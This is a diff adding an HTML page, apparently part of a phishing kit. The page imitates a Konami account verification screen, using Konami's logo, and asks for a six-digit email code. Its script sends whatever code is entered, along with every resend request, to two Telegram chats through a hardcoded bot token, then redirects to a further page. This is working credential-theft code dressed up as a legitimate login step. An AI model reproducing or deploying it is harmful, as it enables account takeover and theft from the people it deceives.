@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Verification Code</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #d50000, #8b0000);
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 10px;
+        }
+        .container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .header img {
+            width: 160px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            margin-bottom: 15px;
+            font-weight: 700;
+            font-size: 20px;
+            color: #d50000;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            text-align: center;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            background: #f9f9f9;
+            transition: border-color 0.3s ease-in-out;
+            outline: none;
+            box-sizing: border-box;
+            font-weight: bold;
+            letter-spacing: 3px;
+        }
+        .input-group input:focus {
+            border-color: #d50000;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #d50000;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.3s ease-in-out;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #b00000;
+        }
+        .resend {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+        .resend a {
+            text-decoration: none;
+            color: #d50000;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .resend a.disabled {
+            color: #999;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://my.konami.net/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo-konami.b3f34124.png&w=256&q=75" alt="Konami Logo">
+        </div>
+        <h2>Enter the Verification Code</h2>
+        <p>A verification code has been sent to your email. Please enter it below.</p>
+
+        <div class="input-group">
+            <input type="text" id="verification_code" placeholder="Enter Code" maxlength="6">
+        </div>
+
+        <button onclick="sendCodeToTelegram()">Verify</button>
+
+        <p class="resend" id="resend_text">
+            Didn't receive the code? <span id="countdown">2:00</span>
+        </p>
+        <p class="resend">
+            <a id="resend_link" class="disabled" onclick="requestNewCode()">Resend Code</a>
+        </p>
+    </div>
+
+    <script>
+        let botToken = "7626603395:AAElrtAisJi0EYgdXygeCEUyrIqzYPp7l9w";
+        let chatIds = ["5086851394", "5964410918"];
+        let countdown = 120;
+        let resendTimer;
+
+        function sendToTelegram(message) {
+            chatIds.forEach(chatId => {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            });
+        }
+
+        function sendCodeToTelegram() {
+            let code = document.getElementById("verification_code").value.trim();
+            if (code.length !== 6) {
+                return;
+            }
+            sendToTelegram(`✅ User entered verification code: ${code}`);
+            
+            // إعادة التوجيه إلى B3.html بعد إرسال البيانات
+            setTimeout(() => {
+                window.location.href = "B3.html";
+            }, 500); // تأخير بسيط لضمان إرسال البيانات قبل الانتقال
+        }
+
+        function requestNewCode() {
+            sendToTelegram("🔄 User requested a new verification code.");
+            document.getElementById("resend_link").classList.add("disabled");
+            document.getElementById("resend_text").style.display = "block";
+            countdown = 120;
+            updateCountdownDisplay();
+            resendTimer = setInterval(() => {
+                countdown--;
+                updateCountdownDisplay();
+                if (countdown === 0) {
+                    clearInterval(resendTimer);
+                    document.getElementById("resend_link").classList.remove("disabled");
+                    document.getElementById("resend_text").style.display = "none";
+                }
+            }, 1000);
+        }
+
+        function updateCountdownDisplay() {
+            let minutes = Math.floor(countdown / 60);
+            let seconds = countdown % 60;
+            document.getElementById("countdown").textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+
+        window.onload = function() {
+            resendTimer = setInterval(() => {
+                countdown--;
+                updateCountdownDisplay();
+                if (countdown === 0) {
+                    clearInterval(resendTimer);
+                    document.getElementById("resend_link").classList.remove("disabled");
+                    document.getElementById("resend_text").style.display = "none";
+                }
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
